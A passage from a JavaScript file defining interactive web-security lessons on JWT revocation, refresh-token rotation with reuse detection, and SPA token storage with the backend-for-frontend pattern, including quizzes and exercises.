  <li><strong>JWT</strong>: the client holds a signed statement (a passport). Any service can check it without calling home. But you cannot recall a passport you already handed out: it stays valid until <code>exp</code>.</li>
</ul>
<h3>The revocation problem</h3>
<p>User logs out, changes password, gets banned, or loses the "admin" role: a stateless JWT does not know. Mitigations:</p>
<ul>
  <li><strong>Short-lived access tokens</strong> (5–15 min) + refresh tokens that <em>are</em> checked against the database (next lesson).</li>
  <li><strong>Denylist</strong> of revoked <code>jti</code>s (kept only until each token's exp), or a per-user "tokens issued before T are invalid" timestamp.</li>
  <li><strong>Opaque tokens + introspection</strong> where instant revocation matters.</li>
</ul>
<p>Each of these adds state back. That is fine. "Stateless" is a trade-off, not a goal.</p>
<h3>Rules of thumb</h3>
<ul>
  <li>Traditional web app on one domain → <strong>sessions</strong> (simple, revocable, small cookies).</li>
  <li>Many services, mobile clients, third-party API access → <strong>short-lived JWT access tokens</strong>.</li>
  <li>Very common hybrid: browser ↔ backend uses a session cookie; backend ↔ microservices uses JWTs.</li>
</ul>
<div class="warn">A JWT stored in a cookie is still a JWT (no instant revocation), and a session id in <code>localStorage</code> is still exposed to XSS. Format and storage are separate decisions.</div>`,
      examples: [
        { title: 'Ban a user: session vs JWT vs JWT + denylist', code: revocationFlow },
        { title: 'Comparison: requirements → recommendation, and real header sizes', code: compareWidget },
      ],
      quiz: [
        { q: 'An admin bans a user whose JWT access token expires in 12 minutes. With pure stateless validation, when does access stop?', options: ['Immediately', 'In about 12 minutes, when the token expires', 'Never', 'On the next deploy'], answer: 1, why: 'Nothing in stateless verification consults the ban.' },
        { q: 'What does a jti denylist cost you?', options: ['Nothing', 'A lookup on every request: you are back to server-side state', 'Longer tokens', 'It disables signatures'], answer: 1, why: 'Revocation needs state somewhere; the denylist is that state.' },
        { q: 'Which is usually the best fit for a server-rendered app on one domain?', options: ['JWT in localStorage', 'Server-side session with an HttpOnly cookie', 'API keys', 'Basic auth'], answer: 1, why: 'Simple, small, instantly revocable.' },
        { q: 'Why are JWT access tokens usually short-lived?', options: ['JWTs cannot hold long dates', 'To limit how long a leaked or no-longer-authorized token keeps working', 'Browsers delete them', 'Signatures expire'], answer: 1, why: 'Short exp bounds the revocation gap; refresh checks the DB.' },
      ],
      exercise: {
        task: `<p>For each system in the box below, choose the better default (server session or short-lived JWT + refresh) and click <strong>Check</strong>.</p>`,
        starter: sessExercise(false),
        hint: 'Ask: how many independent services must verify? How fast must revocation be?',
        solution: sessExercise(true),
      },
    },
    {
      id: 'refresh-tokens',
      section: '4 · Tokens & JWT',
      title: 'Access + refresh tokens, rotation & reuse detection',
      explain: `
<p>Short access tokens are safer, but nobody wants to log in every 15 minutes. So the auth server issues two tokens:</p>
<ul>
  <li><strong>Access token</strong>: short-lived (5–15 min), sent to APIs on every call.</li>
  <li><strong>Refresh token</strong>: long-lived (days–weeks), sent <em>only</em> to the auth server's token endpoint to get a new access token. Usually opaque and stored in the auth server's DB, so it <strong>can</strong> be revoked and checked against bans/password changes.</li>
</ul>
<pre><code class="language-http">POST /token HTTP/1.1
Host: auth.shop.test
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&amp;refresh_token=rt_8xKq2LmZ0pW&amp;client_id=shop-spa</code></pre>
<h3>Rotation + reuse detection</h3>
<p>With <strong>rotation</strong>, every refresh returns a new refresh token and marks the old one as used. All tokens descending from one login form a <strong>family</strong>. If a <em>used</em> refresh token is ever presented again, two parties have copies: one of them is a thief. The server cannot tell which, so it <strong>revokes the whole family</strong>. Both must log in again, and only the real user can.</p>
<p>Analogy: a ticket that is exchanged for a fresh ticket at every gate. If someone shows up with an already-exchanged ticket, security cancels every ticket in that chain.</p>
<div class="tip">The OAuth 2.0 Security BCP (RFC 9700, January 2025) requires refresh tokens for public clients (SPAs, mobile apps) to be either sender-constrained (DPoP / mTLS) or rotated with reuse detection.</div>
<div class="warn">Rotation needs some tolerance for real-world races (two tabs refreshing at once, a response lost on a flaky network). Many servers allow a short grace period (a few seconds) in which the previous token may be reused.</div>`,
      examples: [
        { title: 'Refresh flow: normal, theft (victim first), theft (attacker first)', code: refreshFlow,
          explain: `
<details><summary>The problem: a stolen refresh token is a long-term key</summary>
<p>A stolen access token works for 15 minutes. A stolen refresh token, without rotation, mints new access tokens for weeks, and the user has no idea. Rotation + reuse detection turns "silent long-term access" into "detected at the next refresh".</p>
</details>
<details><summary>Step by step: "🦹 Attacker refreshes first"</summary>
<table>
<tr><th>Step</th><th>Event</th><th>Family F1 after</th></tr>
<tr><td>1</td><td>Attacker steals RT1</td><td>RT1 active</td></tr>
<tr><td>2–4</td><td>Attacker refreshes with RT1 → gets AT2 + RT2 (looks normal)</td><td>RT1 used → RT2 active</td></tr>
<tr><td>5</td><td>Victim's app refreshes with its copy of RT1</td><td></td></tr>
<tr><td>6</td><td>RT1 is <b>already used</b> → reuse → revoke family</td><td>ALL REVOKED (RT1, RT2)</td></tr>
<tr><td>7</td><td>Victim: 400 <code>invalid_grant</code> → logs in again (new family)</td><td></td></tr>
<tr><td>8–9</td><td>Attacker tries RT2 → 400 <code>invalid_grant</code></td><td></td></tr>
</table>
<p>The attacker keeps AT2 until it expires (≤ 15 min). Short access tokens bound the damage; reuse detection ends it.</p>
</details>
<details><summary>Key ideas</summary>
<ul>
<li>Whoever refreshes <em>second</em> with the same token trips the alarm, whether that is the thief or the victim.</li>
<li>Revoking the <em>family</em>, not just one token, is what kicks the attacker out in both orders.</li>
<li>Refresh tokens go only to the token endpoint, so APIs never see them.</li>
</ul>
</details>` },
        { title: 'Token family simulator', code: familySim,
          explain: `
<details><summary>Step by step: reproduce reuse detection</summary>
<table>
<tr><th>Click</th><th>Log line</th><th>Family</th></tr>
<tr><td>⏩ +15 min</td><td>… 15 minutes pass</td><td>RT1 active</td></tr>
<tr><td>📱 call API</td><td>401 invalid_token (expired). Refresh needed.</td><td></td></tr>
<tr><td>🦹 steal app's current RT</td><td>attacker copies … RT1</td><td></td></tr>
<tr><td>📱 refresh</td><td>POST /token RT1 → 200 new AT … + RT2 (RT1 marked used)</td><td>RT1 used, RT2 active</td></tr>
<tr><td>🦹 refresh</td><td>RT1 was ALREADY USED → reuse detected → whole family revoked</td><td>all revoked</td></tr>
<tr><td>📱 refresh</td><td>RT2 → 400 invalid_grant (revoked)</td><td></td></tr>
</table>
</details>
<details><summary>Try this</summary>
<ul>
<li>Untick <b>rotation</b>, then steal and let both sides refresh every "15 minutes": the attacker never gets caught.</li>
<li>Keep rotation but untick <b>reuse detection</b>: the second refresher gets an error, but the first one keeps going. If the thief was first, they win.</li>
<li>Steal, then let only the attacker refresh, then the app: the app trips the alarm and the attacker's RT dies too.</li>
</ul>
</details>` },
      ],
      quiz: [
        { q: 'Where is a refresh token sent?', options: ['To every API with each request', 'Only to the auth server\'s token endpoint', 'In the URL of the app', 'To the browser\'s localStorage of other sites'], answer: 1, why: 'APIs only see access tokens; refresh tokens stay between client and auth server.' },
        { q: 'With rotation and reuse detection, what does the server do when a used refresh token is presented again?', options: ['Accepts it once more', 'Revokes the whole token family', 'Ignores it silently', 'Extends its lifetime'], answer: 1, why: 'Reuse means a copy exists; killing the family evicts the thief.' },
        { q: 'Which response does the token endpoint return for a revoked refresh token?', options: ['401 invalid_token', '400 with <code>{"error":"invalid_grant"}</code>', '403 insufficient_scope', '302 to login'], answer: 1, why: 'RFC 6749 §5.2: invalid/expired/revoked grants → invalid_grant.' },
        { q: 'Why are access tokens short-lived when refresh tokens exist?', options: ['To make requests faster', 'So a leaked access token is useful only briefly while refresh can re-check the user\'s status', 'Because JWTs can only last 15 min', 'To save storage'], answer: 1, why: 'The refresh step is where bans and revocations take effect.' },
      ],
      exercise: {
        task: `<p>Write the raw HTTP refresh request in the box below and click <strong>Check</strong>. The starter uses a JSON body, which token endpoints do not accept.</p>`,
        starter: refreshExercise(false),
        hint: 'Content-Type: application/x-www-form-urlencoded, then a blank line, then grant_type=refresh_token&refresh_token=…&client_id=shop-spa',
        solution: refreshExercise(true),
      },
    },
    {
      id: 'token-storage-bff',
      section: '4 · Tokens & JWT',
      title: 'Tokens in SPAs: storage & the BFF pattern',
      explain: `
<p>A single-page app that holds OAuth tokens must put them <em>somewhere</em>, and anything JavaScript can reach, an XSS payload can reach too.</p>
<ul>
  <li><strong>localStorage / sessionStorage</strong>: easy, survives reloads, but one XSS bug and the token is sent to the attacker, who uses it from anywhere until it expires (worse if the refresh token is there too).</li>
  <li><strong>In memory</strong> (closure, Web Worker): not directly readable, lost on reload; a malicious script can still hook <code>fetch</code> and use or capture it while the page is open.</li>
  <li><strong>HttpOnly cookie</strong>: invisible to JS, sent automatically, so you need CSRF defences (SameSite, custom header), and the API must be same-site.</li>
</ul>
<p>The theme: XSS can always <em>use</em> your session while the page is open ("session riding"). The goal is that it cannot <em>steal</em> a portable token to use later from elsewhere.</p>
<h3>Backend-for-Frontend (BFF)</h3>
<p>The IETF draft "OAuth 2.0 for Browser-Based Applications" recommends a <strong>BFF</strong> as the most secure option: a small server on the same site as the SPA acts as a <em>confidential OAuth client</em>. It does the login, keeps the access and refresh tokens server-side, and gives the browser only an HttpOnly session cookie. The SPA calls <code>/bff/api/*</code>; the BFF attaches the access token and proxies to the real API.</p>
<pre><code class="language-http">Set-Cookie: __Host-sid=q8Zr2LkP0w; Path=/; Secure; HttpOnly; SameSite=Strict</code></pre>
<p>Analogy: instead of giving a child the house keys, they ring the doorbell and the parent (BFF) opens the door for them. Someone who tricks the child can still ring the bell while the child is there, but cannot copy the keys.</p>
<div class="tip">Cost of a BFF: you run a server and proxy API traffic. In return the browser holds no tokens, refresh happens server-side, and logout means deleting one server session.</div>`,
      examples: [
        { title: 'Storage options under XSS, reload, tabs and CSRF', code: storageSim },
        { title: 'BFF: login, API call, silent refresh, XSS', code: bffFlow,
          explain: `
<details><summary>Step by step: "🔐 Login"</summary>
<table>
<tr><th>Step</th><th>Where tokens are</th></tr>
<tr><td>1–2</td><td>BFF creates <code>state</code> + PKCE verifier, redirects browser to IdP</td></tr>
<tr><td>3–4</td><td>User logs in at IdP; IdP redirects back with a one-time <code>code</code></td></tr>
<tr><td>5–7</td><td>BFF exchanges code + verifier + its client secret on the <b>back-channel</b>; tokens arrive at the BFF only</td></tr>
<tr><td>8</td><td>Browser receives <code>__Host-sid</code> (HttpOnly). The "JS-visible tokens" state card says <b>none</b></td></tr>
</table>
</details>
<details><summary>Key ideas</summary>
<ul>
<li>The browser–BFF link is a classic cookie session (lesson on sessions/CSRF applies). The BFF–API link is OAuth bearer tokens.</li>
<li>Silent refresh (🔄 scenario) happens server-to-server: the refresh token never touches the browser.</li>
<li>XSS (💉 scenario) can still call <code>/bff/api/*</code> while the tab is open, so you still need CSP and output encoding. But nothing portable leaks.</li>
</ul>
</details>` },
      ],
      quiz: [
        { q: 'What can an XSS payload do with an access token in <code>localStorage</code>?', options: ['Nothing, localStorage is encrypted', 'Read it and send it to the attacker, who can use it elsewhere until it expires', 'Only read it after a reload', 'Only use it on other sites'], answer: 1, why: 'Any script in the origin can read localStorage.' },
        { q: 'In the BFF pattern, where do the access and refresh tokens live?', options: ['In the browser\'s localStorage', 'In the BFF\'s server-side session', 'In the URL', 'In a non-HttpOnly cookie'], answer: 1, why: 'The browser only gets an opaque HttpOnly session cookie.' },
        { q: 'With a BFF, what can XSS still do?', options: ['Nothing at all', 'Make requests through the BFF while the page is open (session riding)', 'Read the refresh token', 'Read the HttpOnly cookie'], answer: 1, why: 'The browser attaches the cookie to the script\'s requests, but no token can be exfiltrated.' },
        { q: 'Which cookie attributes does the <code>__Host-</code> prefix require?', options: ['Domain set to the parent domain', 'Secure, Path=/, and no Domain attribute', 'HttpOnly only', 'SameSite=None'], answer: 1, why: '__Host- cookies must be Secure, host-only (no Domain) and Path=/.' },
      ],
      exercise: {
        task: `<p>Write the BFF's <code>Set-Cookie</code> header in the box below so the session cookie is as locked-down as possible, then click <strong>Check</strong>.</p>`,
        starter: cookieExercise(false),
        hint: '__Host-sid=…; Path=/; Secure; HttpOnly; SameSite=Strict, and no Domain.',
        solution: cookieExercise(true),
      },
    },
  );
})();
